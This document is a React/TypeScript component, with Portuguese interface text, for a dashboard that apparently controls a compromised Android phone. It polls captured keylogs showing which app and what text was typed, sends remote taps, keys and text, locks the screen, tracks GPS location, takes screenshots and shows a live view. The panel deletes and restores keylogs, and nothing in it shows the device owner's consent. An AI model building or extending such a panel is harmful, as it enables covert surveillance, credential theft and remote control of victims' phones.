import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import LockedScreen from "@/components/LockedScreen";
import PhoneFrame from "@/components/PhoneFrame";
import { trpc } from "@/lib/trpc";
import { useToast } from "@/hooks/use-toast";

interface DeviceDetailsProps {
  deviceId: string;
  deviceName: string;
  onBack: () => void;
}

export default function DeviceDetails({
  deviceId,
  deviceName,
  onBack,
}: DeviceDetailsProps) {
  const [activeTab, setActiveTab] = useState("info");
  const [isLiveActive, setIsLiveActive] = useState(true);
  const [isControlActive, setIsControlActive] = useState(false);
  const [isScreenLocked, setIsScreenLocked] = useState(false);
  const [selectedKeylogs, setSelectedKeylogs] = useState<Set<number>>(new Set());
  const [lockPassword, setLockPassword] = useState<string>("");
  const [lockReason, setLockReason] = useState<string>("Dispositivo travado pelo administrador");
  const [isLocking, setIsLocking] = useState(false);
  
  // ✅ NOVO: Estados para Controle Remoto
  const [remoteInputText, setRemoteInputText] = useState<string>("");
  const [remoteInputType, setRemoteInputType] = useState<"text" | "key" | "tap" | "swipe">("text");
  const [isSendingCommand, setIsSendingCommand] = useState(false);
  const [remoteCommandHistory, setRemoteCommandHistory] = useState<any[]>([]);
  
  const { toast } = useToast();

  // Fetch keylogs from backend
  const { data: keylogs = [], isLoading: keylogsLoading, refetch: refetchKeylogs } = trpc.keylogs.list.useQuery(
    { deviceId },
    { refetchInterval: 2000 } // Atualizar a cada 2 segundos
  );

  // Fetch deleted keylogs from backend
  const { data: deletedKeylogs = [], refetch: refetchDeleted } = trpc.keylogs.deleted.useQuery(
    { deviceId }
  );

  // ✅ NOVO: Fetch screen lock status
  const { data: screenLockStatus, refetch: refetchLockStatus } = trpc.screenLockAdvanced.status.useQuery(
    { deviceId },
    { refetchInterval: 3000 } // Atualizar a cada 3 segundos
  );

  // ✅ NOVO: Fetch remote control history
  const { data: remoteHistory = [], refetch: refetchRemoteHistory } = trpc.remoteControl.history.useQuery(
    { deviceId: parseInt(deviceId), limit: 50 },
    { refetchInterval: 2000 } // Atualizar a cada 2 segundos
  );

  // Mutations
  const deleteKeylogMutation = trpc.keylogs.delete.useMutation({
    onSuccess: () => {
      refetchKeylogs();
      refetchDeleted();
      setSelectedKeylogs(new Set());
    },
  });

  const restoreKeylogMutation = trpc.keylogs.restore.useMutation({
    onSuccess: () => {
      refetchKeylogs();
      refetchDeleted();
    },
  });

  // ✅ NOVO: Mutation para ativar travamento
  const activateLockMutation = trpc.screenLockAdvanced.activate.useMutation({
    onSuccess: () => {
      setIsScreenLocked(true);
      refetchLockStatus();
      toast({
        title: "✅ Sucesso",
        description: "Tela travada com sucesso!",
        variant: "default",
      });
    },
    onError: (error) => {
      toast({
        title: "❌ Erro",
        description: `Erro ao travar: ${error.message}`,
        variant: "destructive",
      });
    },
  });

  // ✅ NOVO: Mutation para desativar travamento
  const deactivateLockMutation = trpc.screenLockAdvanced.deactivate.useMutation({
    onSuccess: () => {
      setIsScreenLocked(false);
      refetchLockStatus();
      toast({
        title: "✅ Sucesso",
        description: "Tela desbloqueada com sucesso!",
        variant: "default",
      });
    },
    onError: (error) => {
      toast({
        title: "❌ Erro",
        description: `Erro ao desbloquear: ${error.message}`,
        variant: "destructive",
      });
    },
  });

  // ✅ NOVO: Mutation para enviar comando remoto
  const sendRemoteCommandMutation = trpc.remoteControl.sendInput.useMutation({
    onSuccess: (data) => {
      toast({
        title: "✅ Comando Enviado",
        description: `Comando ${remoteInputType} enviado com sucesso!`,
        variant: "default",
      });
      setRemoteInputText("");
      refetchRemoteHistory();
    },
    onError: (error) => {
      toast({
        title: "❌ Erro",
        description: `Erro ao enviar comando: ${error.message}`,
        variant: "destructive",
      });
    },
  });

  const handleScreenshot = () => {
    toast({
      title: "📸 Screenshot",
      description: `Screenshot capturado de ${deviceName}`,
    });
  };

  const handleStopLive = () => {
    setIsLiveActive(false);
    toast({
      title: "⏹️ Parado",
      description: "Visualização ao vivo parada",
    });
  };

  const handleActivateControl = () => {
    setIsControlActive(!isControlActive);
    toast({
      title: isControlActive ? "🎮 Desativado" : "🎮 Ativado",
      description: isControlActive
        ? "Controle remoto desativado"
        : "Controle remoto ativado",
    });
  };

  // ✅ CORRIGIDO: Usar mutation para travar
  const handleLockScreen = async () => {
    if (isLocking) return;
    
    setIsLocking(true);
    try {
      await activateLockMutation.mutateAsync({
        deviceId: parseInt(deviceId),
        password: lockPassword || "default_password",
        reason: lockReason,
      });
    } catch (error) {
      console.error("Erro ao travar:", error);
    } finally {
      setIsLocking(false);
    }
  };

  // ✅ CORRIGIDO: Usar mutation para destravar
  const handleUnlockScreen = async () => {
    if (isLocking) return;
    
    setIsLocking(true);
    try {
      await deactivateLockMutation.mutateAsync({
        deviceId: parseInt(deviceId),
      });
    } catch (error) {
      console.error("Erro ao destravar:", error);
    } finally {
      setIsLocking(false);
    }
  };

  // ✅ NOVO: Enviar comando remoto
  const handleSendRemoteCommand = async () => {
    if (!remoteInputText.trim()) {
      toast({
        title: "⚠️ Aviso",
        description: "Digite algo para enviar",
        variant: "destructive",
      });
      return;
    }

    if (isSendingCommand) return;

    setIsSendingCommand(true);
    try {
      await sendRemoteCommandMutation.mutateAsync({
        deviceId: parseInt(deviceId),
        inputType: remoteInputType,
        value: remoteInputText,
      });
    } catch (error) {
      console.error("Erro ao enviar comando:", error);
    } finally {
      setIsSendingCommand(false);
    }
  };

  // ✅ NOVO: Enviar comando com Enter
  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      handleSendRemoteCommand();
    }
  };

  const handleRemoveDevice = () => {
    if (confirm(`Tem certeza que deseja remover ${deviceName}?`)) {
      toast({
        title: "❌ Removido",
        description: `Dispositivo ${deviceName} removido com sucesso`,
      });
      onBack();
    }
  };

  const handleToggleKeylogSelection = (id: number) => {
    const newSelected = new Set(selectedKeylogs);
    if (newSelected.has(id)) {
      newSelected.delete(id);
    } else {
      newSelected.add(id);
    }
    setSelectedKeylogs(newSelected);
  };

  const handleRemoveSelectedKeylogs = () => {
    if (selectedKeylogs.size === 0) {
      toast({
        title: "⚠️ Aviso",
        description: "Selecione pelo menos um keylog para remover",
        variant: "destructive",
      });
      return;
    }
    selectedKeylogs.forEach((id) => {
      deleteKeylogMutation.mutate({ keylogId: id });
    });
  };

  const handleRemoveAllKeylogs = () => {
    if (confirm("Tem certeza que deseja remover TODOS os keylogs?")) {
      keylogs.forEach((keylog) => {
        deleteKeylogMutation.mutate({ keylogId: keylog.id });
      });
    }
  };

  const handleRestoreKeylog = (id: number) => {
    restoreKeylogMutation.mutate({ keylogId: id });
  };

  // Format timestamp to readable time
  const formatTime = (date: Date | string) => {
    const d = new Date(date);
    return d.toLocaleTimeString("pt-BR");
  };

  if (isScreenLocked) {
    return <LockedScreen deviceName={deviceName} onUnlock={handleUnlockScreen} />;
  }

  return (
    <div className="space-y-6 pb-8">
      {/* Header */}
      <div className="flex items-center justify-between">
        <Button
          onClick={onBack}
          variant="outline"
          className="text-cyan-400 border-cyan-600 hover:bg-cyan-900"
        >
          ← Voltar
        </Button>
        <h1 className="text-3xl font-bold text-cyan-400">
          {deviceName}
        </h1>
      </div>

      {/* ✅ NOVO: Status de Travamento */}
      {screenLockStatus && screenLockStatus.isLocked && (
        <Card className="bg-red-900 border-red-700 p-4">
          <div className="flex items-center justify-between">
            <div>
              <p className="text-red-400 font-bold">🔒 Dispositivo Travado</p>
              <p className="text-red-300 text-sm">{screenLockStatus.reason}</p>
            </div>
            <Button
              onClick={handleUnlockScreen}
              disabled={isLocking}
              className="bg-green-600 hover:bg-green-700 text-white"
            >
              🔓 Destravar Agora
            </Button>
          </div>
        </Card>
      )}

      {/* Action Buttons */}
      <div className="flex flex-wrap gap-3">
        <Button
          onClick={handleScreenshot}
          className="bg-cyan-500 hover:bg-cyan-600 text-white"
        >
          📸 Capturar Screenshot
        </Button>
        <Button
          onClick={handleStopLive}
          className="bg-red-600 hover:bg-red-700 text-white"
        >
          ⏹️ Parar Ao Vivo
        </Button>
        <Button
          onClick={handleActivateControl}
          className={`text-white ${
            isControlActive
              ? "bg-green-600 hover:bg-green-700"
              : "bg-blue-600 hover:bg-blue-700"
          }`}
        >
          🎮 {isControlActive ? "Controle Ativo" : "Ativar Controle"}
        </Button>
        <Button
          onClick={handleLockScreen}
          disabled={isLocking}
          className="bg-orange-600 hover:bg-orange-700 text-white disabled:opacity-50"
        >
          {isLocking ? "⏳ Travando..." : "🚫 Travar Tela"}
        </Button>
        <Button
          onClick={handleRemoveDevice}
          className="bg-red-700 hover:bg-red-800 text-white"
        >
          🗑️ Remover Dispositivo
        </Button>
      </div>

      {/* ✅ NOVO: Painel de Controle Remoto */}
      {isControlActive && (
        <Card className="bg-slate-800 border-slate-700 p-6 border-2 border-green-500">
          <h3 className="text-green-400 font-bold mb-4">🎮 Painel de Controle Remoto</h3>
          <div className="space-y-4">
            <div>
              <label className="text-slate-300 text-sm">Tipo de Comando</label>
              <select
                value={remoteInputType}
                onChange={(e) => setRemoteInputType(e.target.value as any)}
                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300"
              >
                <option value="text">📝 Texto</option>
                <option value="key">⌨️ Tecla</option>
                <option value="tap">👆 Toque</option>
                <option value="swipe">👈 Deslizar</option>
              </select>
            </div>
            <div>
              <label className="text-slate-300 text-sm">Comando</label>
              <textarea
                value={remoteInputText}
                onChange={(e) => setRemoteInputText(e.target.value)}
                onKeyPress={handleKeyPress}
                placeholder="Digite o comando aqui... (Enter para enviar)"
                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300 placeholder-slate-500 resize-none h-20"
              />
            </div>
            <Button
              onClick={handleSendRemoteCommand}
              disabled={isSendingCommand || !remoteInputText.trim()}
              className="w-full bg-green-600 hover:bg-green-700 text-white disabled:opacity-50"
            >
              {isSendingCommand ? "⏳ Enviando..." : "✈️ Enviar Comando"}
            </Button>
          </div>
        </Card>
      )}

      {/* ✅ NOVO: Configurações de Travamento */}
      {!isScreenLocked && (
        <Card className="bg-slate-800 border-slate-700 p-6">
          <h3 className="text-cyan-400 font-bold mb-4">🔐 Configurações de Travamento</h3>
          <div className="space-y-4">
            <div>
              <label className="text-slate-300 text-sm">Senha de Desbloqueio (opcional)</label>
              <input
                type="password"
                value={lockPassword}
                onChange={(e) => setLockPassword(e.target.value)}
                placeholder="Digite uma senha para destravar"
                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300 placeholder-slate-500"
              />
            </div>
            <div>
              <label className="text-slate-300 text-sm">Motivo do Travamento</label>
              <input
                type="text"
                value={lockReason}
                onChange={(e) => setLockReason(e.target.value)}
                placeholder="Ex: Dispositivo travado pelo administrador"
                className="w-full mt-2 px-3 py-2 bg-slate-700 border border-slate-600 rounded text-slate-300 placeholder-slate-500"
              />
            </div>
          </div>
        </Card>
      )}

      {/* Tabs */}
      <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
        <TabsList className="grid w-full grid-cols-6 bg-slate-900 border border-slate-700">
          <TabsTrigger
            value="info"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            ℹ️ Informações
          </TabsTrigger>
          <TabsTrigger
            value="commands"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            ⚙️ Comandos
          </TabsTrigger>
          <TabsTrigger
            value="screenshots"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            📸 Screenshots
          </TabsTrigger>
          <TabsTrigger
            value="keylogs"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            ⌨️ Keylogs
          </TabsTrigger>
          <TabsTrigger
            value="remote"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            🎮 Controle
          </TabsTrigger>
          <TabsTrigger
            value="history"
            className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white"
          >
            📜 Histórico
          </TabsTrigger>
        </TabsList>

        {/* Aba: Informações */}
        <TabsContent value="info" className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <Card className="bg-slate-800 border-slate-700 p-6">
              <h3 className="text-cyan-400 font-bold mb-4">📋 Informações Básicas</h3>
              <div className="space-y-3 text-slate-300">
                <div>
                  <p className="text-slate-400 text-sm">Nome do Dispositivo</p>
                  <p className="font-semibold">{deviceName}</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Modelo</p>
                  <p className="font-semibold">Samsung Galaxy A12</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Sistema Operacional</p>
                  <p className="font-semibold">Android 11</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Versão</p>
                  <p className="font-semibold">11.0.1</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Localização</p>
                  <p className="font-semibold">São Paulo, SP</p>
                </div>
              </div>
            </Card>

            <Card className="bg-slate-800 border-slate-700 p-6">
              <h3 className="text-cyan-400 font-bold mb-4">📊 Status do Sistema</h3>
              <div className="space-y-3">
                <div>
                  <div className="flex justify-between mb-1">
                    <p className="text-slate-400 text-sm">Bateria</p>
                    <p className="text-cyan-400 font-semibold">85%</p>
                  </div>
                  <div className="w-full bg-slate-700 rounded-full h-2">
                    <div className="bg-green-500 h-2 rounded-full" style={{ width: "85%" }}></div>
                  </div>
                </div>
                <div>
                  <div className="flex justify-between mb-1">
                    <p className="text-slate-400 text-sm">Memória</p>
                    <p className="text-cyan-400 font-semibold">4.2 GB / 8 GB</p>
                  </div>
                  <div className="w-full bg-slate-700 rounded-full h-2">
                    <div className="bg-blue-500 h-2 rounded-full" style={{ width: "52.5%" }}></div>
                  </div>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Sinal</p>
                  <p className="text-cyan-400 font-semibold">📶 Excelente</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Temperatura</p>
                  <p className="text-cyan-400 font-semibold">36°C</p>
                </div>
                <div>
                  <p className="text-slate-400 text-sm">Último Acesso</p>
                  <p className="text-cyan-400 font-semibold">Agora</p>
                </div>
              </div>
            </Card>
          </div>
        </TabsContent>

        {/* Aba: Comandos */}
        <TabsContent value="commands" className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {[
              { icon: "📸", title: "Tirar Screenshot", desc: "Capturar tela do dispositivo" },
              { icon: "🔊", title: "Ativar Som", desc: "Reproduzir som no dispositivo" },
              { icon: "🔒", title: "Bloquear Dispositivo", desc: "Bloquear a tela do dispositivo" },
              { icon: "🚫", title: "Travar Tela", desc: "Travar a tela permanentemente" },
              { icon: "📍", title: "Rastrear Localização", desc: "Obter localização GPS em tempo real" },
              { icon: "🔄", title: "Sincronizar", desc: "Sincronizar dados do dispositivo" },
            ].map((cmd, idx) => (
              <Card key={idx} className="bg-slate-800 border-slate-700 p-4 hover:border-cyan-500 transition">
                <div className="flex items-start justify-between">
                  <div>
                    <p className="text-2xl mb-2">{cmd.icon}</p>
                    <h4 className="text-cyan-400 font-bold">{cmd.title}</h4>
                    <p className="text-slate-400 text-sm mt-1">{cmd.desc}</p>
                  </div>
                </div>
                <Button className="w-full mt-3 bg-cyan-600 hover:bg-cyan-700">
                  Executar
                </Button>
              </Card>
            ))}
          </div>
        </TabsContent>

        {/* Aba: Screenshots */}
        <TabsContent value="screenshots" className="space-y-4">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <h3 className="text-cyan-400 font-bold mb-4">📸 Screenshots Capturados (6)</h3>
            <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
              {[1, 2, 3, 4, 5, 6].map((i) => (
                <div key={i} className="bg-slate-700 rounded-lg aspect-video flex items-center justify-center border border-slate-600 hover:border-cyan-500 transition cursor-pointer">
                  <p className="text-slate-400">📱 Screenshot {i}</p>
                </div>
              ))}
            </div>
          </Card>
        </TabsContent>

        {/* Aba: Keylogs */}
        <TabsContent value="keylogs" className="space-y-4">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-cyan-400 font-bold">⌨️ Keylogs Capturados ({keylogs.length})</h3>
              <div className="flex gap-2">
                <Button
                  onClick={handleRemoveSelectedKeylogs}
                  disabled={selectedKeylogs.size === 0}
                  className="bg-red-600 hover:bg-red-700 text-white disabled:opacity-50"
                >
                  🗑️ Remover Selecionados ({selectedKeylogs.size})
                </Button>
                <Button
                  onClick={handleRemoveAllKeylogs}
                  className="bg-red-700 hover:bg-red-800 text-white"
                >
                  ⚠️ Remover Todos
                </Button>
              </div>
            </div>

            {keylogsLoading ? (
              <p className="text-slate-400 text-center py-8">Carregando keylogs...</p>
            ) : keylogs.length === 0 ? (
              <p className="text-slate-400 text-center py-8">Nenhum keylog capturado</p>
            ) : (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {keylogs.map((log) => (
                  <div
                    key={log.id}
                    className="flex items-center gap-3 p-3 bg-slate-700 rounded border border-slate-600 hover:border-cyan-500 transition"
                  >
                    <input
                      type="checkbox"
                      checked={selectedKeylogs.has(log.id)}
                      onChange={() => handleToggleKeylogSelection(log.id)}
                      className="w-4 h-4 cursor-pointer"
                    />
                    <div className="flex-1">
                      <p className="text-slate-300">
                        <span className="text-cyan-400">{log.appName}</span>: {log.keyText}
                      </p>
                      <p className="text-slate-500 text-xs">{formatTime(log.createdAt)}</p>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </Card>
        </TabsContent>

        {/* ✅ NOVO: Aba: Controle Remoto */}
        <TabsContent value="remote" className="space-y-4">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <h3 className="text-cyan-400 font-bold mb-4">🎮 Histórico de Comandos Remotos ({remoteHistory.length})</h3>
            {remoteHistory.length === 0 ? (
              <p className="text-slate-400 text-center py-8">Nenhum comando enviado</p>
            ) : (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {remoteHistory.map((cmd, idx) => (
                  <div
                    key={idx}
                    className="flex items-center gap-3 p-3 bg-slate-700 rounded border border-slate-600 hover:border-green-500 transition"
                  >
                    <div className="flex-1">
                      <p className="text-slate-300">
                        <span className="text-green-400">{cmd.inputType}</span>: {cmd.value}
                      </p>
                      <p className="text-slate-500 text-xs">
                        Status: <span className={cmd.status === "completed" ? "text-green-400" : "text-yellow-400"}>{cmd.status}</span>
                      </p>
                      <p className="text-slate-500 text-xs">{formatTime(cmd.createdAt)}</p>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </Card>
        </TabsContent>

        {/* Aba: Histórico */}
        <TabsContent value="history" className="space-y-4">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <h3 className="text-cyan-400 font-bold mb-4">📜 Histórico de Keylogs Removidos ({deletedKeylogs.length})</h3>
            {deletedKeylogs.length === 0 ? (
              <p className="text-slate-400 text-center py-8">Nenhum keylog no histórico</p>
            ) : (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {deletedKeylogs.map((log) => (
                  <div
                    key={log.id}
                    className="flex justify-between items-center p-3 bg-slate-700 rounded border border-slate-600 hover:border-yellow-500 transition"
                  >
                    <div>
                      <p className="text-slate-300">
                        <span className="text-yellow-400">{log.appName}</span>: {log.keyText}
                      </p>
                      <p className="text-slate-500 text-xs">{formatTime(log.createdAt)}</p>
                    </div>
                    <Button
                      onClick={() => handleRestoreKeylog(log.id)}
                      className="bg-green-600 hover:bg-green-700 text-white text-sm"
                    >
                      ↩️ Restaurar
                    </Button>
                  </div>
                ))}
              </div>
            )}
          </Card>
        </TabsContent>
      </Tabs>

      {/* Visualização ao Vivo */}
      {isLiveActive && (
        <div className="mt-8">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <h3 className="text-cyan-400 font-bold mb-4">
              🔴 Visualização Ao Vivo
            </h3>
            <div className="flex justify-center py-8">
              <PhoneFrame status="Transmissão ao vivo do dispositivo" />
            </div>
          </Card>
        </div>
      )}
    </div>
  );
}
